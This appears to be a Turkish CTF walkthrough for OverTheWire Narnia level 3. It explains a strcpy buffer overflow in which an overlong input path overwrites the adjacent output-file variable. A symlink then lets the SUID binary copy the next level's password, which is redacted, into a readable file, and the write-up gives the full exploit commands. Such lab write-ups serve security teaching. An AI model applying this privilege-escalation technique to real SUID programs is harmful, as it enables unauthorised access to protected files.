# OverTheWire — Narnia Level 3 → 4

> Hedef: `narnia3`'ten `narnia4` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: bitişik buffer overflow (`ifile`→`ofile`) + **symlink** ile yetki köprüsü.

---

## 1. Bağlantı
```bash
ssh narnia3@narnia.labs.overthewire.org -p 2226
```

## 2. Kaynak
```c
char ofile[16] = "/dev/null";   // çıktı (sabit, şimdilik)
char ifile[32];                 // girdi yolu
char buf[32];
if(argc != 2){ ...; exit(-1); }
strcpy(ifile, argv[1]);         // AÇIK: sınır yok -> ifile taşar, ofile'ı ezer
ofd = open(ofile, O_RDWR);
ifd = open(ifile, O_RDONLY);
read(ifd, buf, sizeof(buf)-1);  // ifile'dan 31 byte
write(ofd, buf, sizeof(buf)-1); // ofile'a 31 byte
printf("copied contents of %s to a safer place... (%s)\n", ifile, ofile);
```

## 3. Zafiyet — iki değişken tek string
`ifile[32]` ile `ofile[16]` bitişik (`ifile` alçak, `ofile` yüksek adres). `argv[1]` 32
byte'tan uzunsa `ifile` taşar, fazlalık `ofile`'ı ezer. `ifile` null'suz kaldığı için:
- `ifile` (C-string, null'a kadar) = **tüm `argv[1]`** → `open(ifile)` bunu açar.
- `ofile` (taşan kısım) = `argv[1][32..]` → `open(ofile)` bunu açar.

> 🔑 narnia3 **SUID narnia4** → `open` etkin uid=narnia4 ile çalışır. `ifile`'ı narnia4
> şifresine giden bir **symlink** yaparsan, program onu narnia4 yetkisiyle okuyup bizim
> okuyabildiğimiz `ofile`'a yazar. Symlink = yetki köprüsü.

## 4. Saldırı — dolgu hesabı
İlk 32 byte = `WD/dirname/` (32. byte = `readthis`'ten önceki `/`), kalan = `readthis`:
```
argv[1] = "$WD/$DIR/readthis"
          └── ilk 32 (ifile) ──┘└ ofile="readthis" ┘
len(WD) + 1 + N + 1 = 32   →   N = 30 - len(WD)
```

```bash
WD=$(mktemp -d /tmp/n3XXXX); chmod 755 "$WD"; cd "$WD"     # mktemp -d 700 -> chmod 755 ŞART
N=$((30 - ${#WD}))                                          # örn WD 11 -> N=19
DIR=$(python3 -c "print('A'*$N)"); mkdir "$DIR"; chmod 755 "$DIR"
ln -s /etc/narnia_pass/narnia4 "$WD/$DIR/readthis"         # ifile (full) -> narnia4 pass
touch readthis; chmod 666 readthis                         # ofile = ./readthis (yazılabilir)
/narnia/narnia3 "$WD/$DIR/readthis"
cat readthis                                               # narnia4 şifresi (+ çöp byte, 31-read)
```
Çıktı: `copied contents of /tmp/n3.../AAA.../readthis to a safer place... (readthis)`



## Dersler
| Konu | Not |
|------|-----|
| İki değişken tek string | Taşan `ifile` aynı anda `ifile`(full)+`ofile`(taşma)'yı kontrol eder |
| symlink yetki köprüsü | SUID narnia4 symlink'i takip edip narnia4 pass okur |
| izinler kritik | çıktı `chmod 666`, dizinler `755` (euid=narnia4 erişsin); `mktemp -d` 700 → 755 |
| dolgu = path uzunluğu | `len(WD)+1+N+1=32` olacak N hesapla |


